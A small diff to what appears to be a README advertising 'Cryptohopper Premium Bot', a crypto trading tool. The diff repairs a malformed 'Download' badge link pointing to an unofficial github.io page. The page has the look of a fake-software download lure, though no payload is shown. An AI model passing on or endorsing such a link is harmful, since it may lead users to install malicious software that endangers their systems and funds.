@@ -2,7 +2,7 @@
 
 Cryptohopper Premium Bot is a cutting-edge automated trading solution designed for crypto enthusiasts seeking efficiency and precision. Leveraging AI-driven strategies and real-time analytics, it seamlessly integrates with major exchanges to optimize trading performance.
 
-[![Download Cryptohopper Premium Bot](https://img.shields.io/badge/Download-Cryptohopper_Premium_Bot-blueviolet)](https;//cryptohopper-premium-bot.github.io/.github)
+[![Download Cryptohopper Premium Bot](https://img.shields.io/badge/Download-Cryptohopper_Premium_Bot-blueviolet)](https://cryptohopper-premium-bot.github.io/.github)
 
 ---
 
